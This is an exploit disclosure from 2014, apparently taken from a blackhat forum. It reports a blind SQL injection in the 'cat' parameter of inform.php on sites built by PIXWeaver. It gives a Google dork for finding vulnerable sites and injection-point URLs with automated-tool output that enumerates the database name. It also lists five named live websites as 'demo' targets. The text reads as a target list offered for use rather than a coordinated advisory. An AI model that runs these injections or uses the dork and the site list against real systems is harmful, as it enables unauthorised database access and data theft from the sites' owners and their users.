#Website by PIXWeaver Blind SQL Injection Disclosure

* Exploit Title        : Website by PIXWeaver Blind SQL Injection Disclosure
* Google Dork          : inurl:/inform.php?cat=
* Date                 : 26/08/2014
* Exploit Author       : Barrabravaz
* Vendor Homepage      : http://www.pixweaver.com/
* Version              : -
* Tested on            : Windows, Linux

## Author will be not responsible for any damage
#### Issue: 
##### Blind SQL Injection Disclosure Vulnerability
#### Risk level: High

### Proof Of Concept:
`http://127.0.0.1/inform.php?cat=%inject_here%&pv=45`
* ( take Havij for example )
* Host IP: 207.112.70.25
* Web Server: Apache/2.2.27
* Powered-by: PHP/5.4.16
* Keyword Found: Last
* Injection type is String (')
* DB Server: MySQL >=5
* Trying another method using keyword for finding columns count
* Findig columns count for MySQL failed!
* Testing for MySQL error based injection method
* MySQL error based injection method cant be used!
* Trying blind method
* Finding current data base
* Length of 'Current DB' is 7
* Current DB: test_db

## DEMO
`http://toybuildingzone.com/inform.php?cat=%inject_here%&pv=45`
`http://www.sportsystemscorp.com/inform.php?cat=%inject_here%`
`http://www.cantow.ca/inform.php?cat=%inject_here%&nv=188`
`http://www.agl.ca/inform.php?cat=%inject_here%&nv=23`
`http://www.movemyhottub.ca/inform.php?cat=%inject_here%&nv=150`

## Thanks To
* Allah SWT
* Cyptn my beloved
* $$Hunter
* IDC
* Jim Geovedi
* Yogyakarta Blackhat
* Yogyacarderlink
* And you...

* Discovered By Barrabravaz
* barrabravaz@outlook.com 
* jasasekuritionline[dot]com
* https://fb.me/akubocahmuyank

[Original Article](http://www.surabayablackhat.org/forum/thread-3112.html)